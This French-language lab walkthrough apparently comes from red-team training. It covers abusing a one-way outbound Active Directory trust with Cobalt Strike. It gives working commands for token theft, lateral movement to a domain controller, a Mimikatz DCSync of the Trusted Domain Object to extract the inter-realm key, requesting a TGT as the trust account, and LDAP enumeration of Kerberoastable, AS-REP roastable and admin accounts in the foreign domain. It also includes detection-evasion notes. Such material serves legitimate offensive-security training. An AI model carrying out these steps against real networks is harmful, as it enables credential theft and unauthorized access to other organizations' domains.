# Lab — Outbound Trusts

> L’objectif est d’effectuer une **énumération entre deux domaines** liés par une Outbound Trust à sens unique, à partir de la clé inter-realm stockée dans le Trusted Domain Object (TDO).

===

## Relation de Trust  

Ce lab explore la **direction inverse** de celui consacré aux Inbound Trusts.  

```
┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
│           PARTNER.COM               │        │          CONTOSO.COM                │
│  (OUR domain — beacon runs here)    │        │  (foreign domain — target of enum)  │
│                                     │        │                                     │
│  Domain SID:                        │        │  Domain SID:                        │
│  S-1-5-21-4244029708-               │        │  S-1-5-21-3926355307-               │
│       1901239654-2578485347         │        │       1661546229-813047887          │
│                                     │        │                                     │
│  trustDirection = 2 (OUTBOUND) ─────┼───────►│  PARTNER trusts CONTOSO             │
│                                     │        │                                     │
│  Our resources trust CONTOSO users  │        │  DC: lon-dc-1.contoso.com           │
│  CONTOSO users can access US        │        │  KDC: 10.10.120.1                   │
└─────────────────────────────────────┘        └─────────────────────────────────────┘
         TRUSTING domain                                   TRUSTED domain
   (resources are here — our beacon)                 (accounts originate here)
```

**Flux normal (légitime) :**  
> Les utilisateurs CONTOSO s’authentifient auprès du DC PARTNER et accèdent aux ressources PARTNER. L’inverse n’est pas autorisé par cette Trust à sens unique.  

**Scénario d’attaque :**  
> Le point de départ est PARTNER (domaine faisant confiance). Normalement, aucun accès à CONTOSO (domaine approuvé) n’est accordé.  
> La clé inter-realm est toutefois stockée **des deux côtés**.  
> Le scénario utilise DCSync sur le TDO de PARTNER pour récupérer cette clé partagée, puis s’authentifier au KDC de CONTOSO sous le compte de Trust.  
> Cela permet d’obtenir un contexte authentifié dans CONTOSO pour l’énumération.  

---

## Qu’est-ce qu’un Trusted Domain Object (TDO) ?

Lors de la création d’une Trust, chaque domaine conserve un objet `trustedDomain` dans `CN=System`. Cet objet contient :
- Le FQDN et le SID du domaine partenaire.
- La direction de la Trust et ses attributs.
- La **clé inter-realm**, secret partagé (hash de mot de passe) utilisé par les KDC pour les tickets cross-realm.

La clé de Trust est stockée dans le TDO comme le secret d’un compte machine. Dans le scénario, DCSync peut la répliquer, mais le TDO doit être ciblé par son **objectGUID**, car il ne s’agit pas d’un compte utilisateur.

---

## Trust Account — PARTNER$ dans CONTOSO

Lors de l’établissement de la Trust, CONTOSO a créé dans son annuaire un compte **`PARTNER$`**. Son secret correspond à la clé inter-realm présente dans le TDO de PARTNER. Ce compte représente le domaine PARTNER auprès du KDC de CONTOSO.

Le KDC de CONTOSO utilise la clé de `PARTNER$` pour valider les tickets cross-realm venant de PARTNER. Le lab montre qu’une clé récupérée peut permettre une authentification `PARTNER$` et l’obtention d’un TGT donnant un accès de lecture authentifié à l’annuaire CONTOSO.

```
What we have:            What we want:
PARTNER DA access   →    Enumerate CONTOSO (find Kerberoastable accounts,
                         users, groups, further attack paths)

The bridge:
TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOSO KDC
→ TGT for PARTNER$@CONTOSO → LDAP queries against CONTOSO
```

## Déroulement du lab

1. Lancer Cobalt Strike et se connecter au team server.
2. Interagir avec le Beacon et énumérer la Trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
    ```

    > Interroge le domaine PARTNER pour récupérer les objets `trustedDomain` dans `CN=System,DC=partner,DC=com`. Les attributs indiquent :
    > - `trustPartner` — FQDN du domaine partenaire (ici `contoso.com`).
    > - `trustDirection` — Direction de la Trust du point de vue de PARTNER.
    > - `trustAttributes` — Flags (8 = forest trust avec SID filtering).
    > - `flatName` — Nom NetBIOS du partenaire (par exemple `CONTOSO`).

⚠️ Comment interpréter les résultats ?
    >
    > - `trustDirection 2` = **TRUST_DIRECTION_OUTBOUND** — PARTNER fait confiance à CONTOSO. Les utilisateurs CONTOSO peuvent accéder aux ressources PARTNER, mais pas l’inverse.
    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — Forest Trust avec SID filtering à la frontière. Le scénario ne permet pas d’injecter librement des SID History dans les tickets qui traversent cette frontière.

3. Récupérer le GUID du TDO.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
    ```

    > **Pourquoi le GUID ?** DCSync réplique habituellement des objets de comptes utilisateurs ou machines identifiés par `sAMAccountName`.  
    Le TDO est un objet `trustedDomain` stocké dans `CN=System`.  
    Pour le cibler avec DCSync (Mimikatz `lsadump::dcsync`), il faut utiliser son `objectGUID` avec l’option `/guid:`.
    >
    > Le GUID `{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}` correspond au TDO de PARTNER pour CONTOSO. Il constitue la variable `[TDO_GUID]` utilisée à l’étape 5.

4. Injecter un payload Beacon dans le processus `vwebber`.

> DCSync nécessite les permissions de réplication `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`.  

```
process_browser
steal_token <pid vwebber>
```

> **OPSEC-🟠CAUTION** 
 L’injection de processus produit de la télémétrie. Les notes privilégient `steal_token <pid>` lorsqu’une simple Token Impersonation suffit pour DCSync.

> ⚠️ **Lateral Movement vers par-dc-1 — `jump scshell64` échoue si `defragsvc` est déjà actif (observé le 29/04/2026) :**

> Jump vers le Domain Controller PARTNER :  

```
jump winrm64 par-dc-1 smb
```  

5. Utiliser le nouveau Beacon pour récupérer la clé inter-realm partagée du TDO avec DCSync.

```Beacon-nocolor
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```


OPSEC-🔴UNSAFE (chemin Cobalt Strike uniquement, sans alternative dans le Beacon selon les notes)
Effectue une requête DCSync vers le DC de PARTNER (`/domain:partner.com`). L’option `/guid:` demande à Mimikatz de répliquer l’objet TDO précis plutôt qu’un compte utilisateur.
    >
    > Le TDO stocke le secret de Trust comme un compte machine stocke son mot de passe. Mimikatz extrait :
    > - `rc4_hmac_nt` — Hash RC4/NT de la clé de Trust, noté `[TRUST KEY]` à l’étape 6.
    > - `aes256_hmac` — Version AES256 de cette clé, à privilégier lorsque la commande l’accepte.
    >
    > Relever la valeur `rc4_hmac_nt` dans la sortie.
    >
    > **OPSEC-🔴UNSAFE** — DCSync peut générer l’**Event 4662** sur le DC de PARTNER. Une réplication du TDO plutôt que d’un compte peut être inhabituelle dans les logs. Utiliser AES256 lorsqu’il est disponible, selon les notes.
    >
    > ⚠️ **`[Out]` et `[Out-1]` — utiliser `[Out]` (observé le 29/04/2026) :** le TDO présente `[Out]` (clé courante) et `[Out-1]` (clé précédente).  
L’utilisation du hash RC4 de `[Out-1]` peut faire échouer `krb_asktgt` avec **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`).  
Dans ce lab, prendre la clé du bloc `[Out]` et privilégier `aes256_hmac` à `rc4_hmac_nt`.  

6. Demander un TGT du compte de Trust à l’aide du secret partagé.  

```Beacon-nocolor
krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
```

    > **Fonctionnement :** une requête AS-REQ est envoyée au **KDC de CONTOSO** (`/dc:lon-dc-1.contoso.com`, DC du domaine distant) afin d’obtenir un TGT pour `PARTNER$`.
    >
    > **Pourquoi `PARTNER$` dans `contoso.com` ?** CONTOSO a créé ce compte de Trust dans `CN=Users,DC=contoso,DC=com`. Son secret est la clé inter-realm partagée avec le TDO de PARTNER.
    >
    > Le KDC de CONTOSO valide l’AS-REQ avec la clé de `PARTNER$` et émet un TGT pour `PARTNER$@CONTOSO.COM`.
    >
    > **Ticket obtenu :** `TGT_PARTNER$` est un TGT Kerberos émis par CONTOSO. Dans le lab, il fournit une identité authentifiée avec des droits suffisants pour l’énumération LDAP.
    >
    > **OPSEC-🟠CAUTION** — Peut générer l’**Event 4768** (AS-REQ) sur `lon-dc-1`. Une authentification RC4 de `PARTNER$` depuis une IP inattendue peut être signalée par MDI ou un SIEM.

7. Injecter le TGT dans une session de logon temporaire.

    > **Pourquoi une session temporaire ?** Injecter un ticket dans la session courante peut provoquer un conflit Kerberos. Une session isolée créée avec `make_token` et des credentials fictifs permet d’utiliser le TGT CONTOSO sans modifier la session principale du Beacon.

    **Étape 7a — Créer une session de logon temporaire :**

```Beacon-nocolor
make_token CONTOSO\PARTNER$ FakePassword
```

    > Crée une session de logon de type 9. Le mot de passe est un placeholder non validé sur le réseau ; la session accueille le ticket injecté.

    **Étape 7b — Convertir le ticket Base64 en `.kirbi` sur l’Attacker Desktop :**

    > **Important :** `kerberos_ticket_use` attend le **chemin d’un fichier `.kirbi`** sur le client Cobalt Strike, pas la chaîne Base64 brute. Sinon, l’erreur `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist` peut apparaître.  


> Sur l’Attacker Desktop, convertir le Base64 en fichier `.kirbi` avec PowerShell :  

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
```

Puis injecter le ticket avec la commande native Cobalt Strike :

```Beacon-nocolor
kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
```

    > **OPSEC-🟢SAFE** — Injection via l’API Windows Kerberos, sans nouveau processus ni écriture disque sur la cible. Le `.kirbi` reste sur l’Attacker Desktop.

8. Énumérer le domaine approuvé.

    ```Beacon-nocolor
    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
    ```

    > **Fonctionnement :** interroge LDAP sur CONTOSO avec le TGT `PARTNER$` injecté. `--hostname contoso.com` et `--dn DC=contoso,DC=com` ciblent explicitement l’annuaire du domaine distant.
    >
    > `PARTNER$` dispose des permissions de lecture d’un utilisateur authentifié dans CONTOSO, notamment pour :
    > - Lire les objets utilisateurs, groupes et ordinateurs.

## Post-Enumeration — Exploiter les résultats CONTOSO

Après l’obtention du TGT `PARTNER$@CONTOSO.COM`, les requêtes LDAP suivantes permettent de poursuivre l’énumération :

### Identifier les comptes Kerberoastable dans CONTOSO

```Beacon-nocolor
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName
```

> Les comptes avec un SPN peuvent être examinés pour Kerberoasting. Un service ticket chiffré avec le secret du compte peut être analysé hors ligne. Le lab utilise `krb_asktgs /service:<SPN> /ticket:[PARTNER$_TGT]` depuis la session temporaire.

### Identifier les comptes AS-REP Roastable dans CONTOSO

```Beacon-nocolor
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName
```

> Le flag `userAccountControl` `4194304` correspond à `DONT_REQUIRE_PREAUTH`. Ces comptes peuvent renvoyer une réponse AS-REP sans pré-authentification, exploitable pour une analyse hors ligne.

### Identifier les comptes Domain Admin dans CONTOSO

```Beacon-nocolor
ldapsearch (memberOf=CN=Domain Admins,CN=Users,DC=contoso,DC=com) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,userAccountControl
```

### Identifier d’autres Trusts depuis CONTOSO

```Beacon-nocolor
ldapsearch (objectClass=trustedDomain) --hostname contoso.com --dn DC=contoso,DC=com --attributes trustDirection,trustPartner,trustAttributes
```

> CONTOSO peut posséder des Trusts vers d’autres domaines, ce qui élargit le périmètre d’énumération. Le scénario envisage une chaîne PARTNER → CONTOSO → THIRD_DOMAIN.
